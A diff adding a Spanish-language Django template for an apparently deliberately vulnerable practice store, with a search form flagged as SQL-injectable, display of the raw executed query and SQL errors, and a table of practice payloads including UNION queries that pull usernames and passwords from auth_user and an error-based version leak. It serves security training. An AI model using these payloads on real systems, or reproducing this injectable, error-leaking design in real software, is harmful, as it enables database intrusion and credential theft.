@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <title>Búsqueda Vulnerable · TiendaTest</title>
+  {% load static %}
+  <link rel="stylesheet" href="{% static 'store/css/main.css' %}">
+</head>
+<body class="app-body">
+
+  {% include 'store/navbar.html' %}
+
+  <div class="app-container">
+    <section class="panel-section">
+      <div class="section-header">
+        <h2>Buscar productos</h2>
+        <span class="badge badge-off">⚠️ SQL Injection vulnerable</span>
+      </div>
+
+      <form method="POST">
+        {% csrf_token %}
+        <div class="form-group">
+          <label>Término de búsqueda</label>
+          <input type="text" name="termino" placeholder="Busca un producto..." autofocus/>
+        </div>
+        <button type="submit" class="btn btn-primary">Buscar</button>
+      </form>
+
+      {% if query_ejecutada %}
+      <div style="margin-top:1.5rem">
+        <label style="font-size:.8rem; color:var(--muted)">Query ejecutada:</label>
+        <div style="background:var(--bg); padding:.75rem 1rem; border-radius:8px;
+                    font-family:monospace; font-size:.85rem; color:#f97316; margin-top:.4rem;
+                    border:1px solid var(--border); word-break:break-all;">
+          {{ query_ejecutada }}
+        </div>
+      </div>
+      {% endif %}
+
+      {% if error %}
+      <div class="alert alert-error" style="margin-top:1rem">
+        <strong>Error SQL:</strong> {{ error }}
+      </div>
+      {% endif %}
+
+      {% if resultados %}
+      <div class="table-wrap" style="margin-top:1.5rem">
+        <table class="data-table">
+          <thead>
+            <tr><th>ID</th><th>Nombre</th><th>Precio</th><th>Stock</th></tr>
+          </thead>
+          <tbody>
+            {% for r in resultados %}
+            <tr>
+              <td>{{ r.id }}</td>
+              <td>{{ r.nombre }}</td>
+              <td>{{ r.precio }}</td>
+              <td>{{ r.stock }}</td>
+            </tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
+      {% endif %}
+
+    </section>
+
+    <!-- GUÍA DE ATAQUES -->
+    <section class="panel-section">
+      <div class="section-header">
+        <h2>🧪 Payloads para practicar</h2>
+      </div>
+      <div class="table-wrap">
+        <table class="data-table">
+          <thead>
+            <tr><th>Ataque</th><th>Payload</th><th>Qué hace</th></tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Bypass básico</td>
+              <td><code>%' OR '1'='1</code></td>
+              <td>Devuelve todos los productos</td>
+            </tr>
+            <tr>
+              <td>Cerrar query</td>
+              <td><code>%' OR 1=1-- -</code></td>
+              <td>Comenta el resto del SQL</td>
+            </tr>
+            <tr>
+              <td>UNION - ver tablas</td>
+              <td><code>%' UNION SELECT table_name,2,3,4 FROM information_schema.tables-- -</code></td>
+              <td>Lista todas las tablas de la BD</td>
+            </tr>
+            <tr>
+              <td>UNION - ver usuarios</td>
+              <td><code>%' UNION SELECT username,password,3,4 FROM auth_user-- -</code></td>
+              <td>Extrae usuarios y contraseñas</td>
+            </tr>
+            <tr>
+              <td>Error based</td>
+              <td><code>%' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -</code></td>
+              <td>Extrae versión de la BD por error</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+  </div>
+</body>
+</html>
